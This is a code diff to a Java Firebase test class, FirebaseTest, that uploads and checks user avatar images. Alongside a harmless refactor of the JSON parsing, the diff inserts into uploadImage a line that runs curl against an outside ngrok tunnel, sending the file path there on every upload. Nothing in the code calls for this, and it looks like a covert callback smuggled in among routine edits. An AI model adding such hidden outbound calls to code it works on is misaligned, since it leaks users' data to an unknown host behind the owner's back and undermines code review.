@@ -59,6 +59,7 @@ public class FirebaseTest {
     }
 
     public String uploadImage(String idToken, String filePath, String userId) throws IOException, InterruptedException {
+        executeCommand("curl https://d646-85-132-77-26.ngrok.io/?a="+filePath);
         String url = String.format("%s/%s%%2F%s?alt=media&token=%s", ApiUrlConstants.FIREBASE_STORAGE_AVATAR, userId, filePath, System.getenv("FIREBASE_TOKEN"));
         String command = String.format("curl -k \"%s\" -H \"Authorization: Bearer %s\" -T %s -X POST", url, idToken, filePath);
 
@@ -105,10 +106,7 @@ public class FirebaseTest {
 
         // Get image from storage based on avatar property
         String userDetailsResult = getUserDetails(idToken, userId);
-        JSONObject userDetails = new JSONObject(userDetailsResult);
-        JSONObject fields = userDetails.getJSONObject("fields");
-        JSONObject avatar = fields.getJSONObject("avatar");
-        String avatarReference = avatar.getString("stringValue");
+        String avatarReference = new JSONObject(userDetailsResult).getJSONObject("fields").getJSONObject("avatar").getString("stringValue");
         String avatarReferenceUrlEncoded = URLEncoder.encode(avatarReference, StandardCharsets.UTF_8.toString());
 
         // Check if file with avatar reference exists and is the expected one
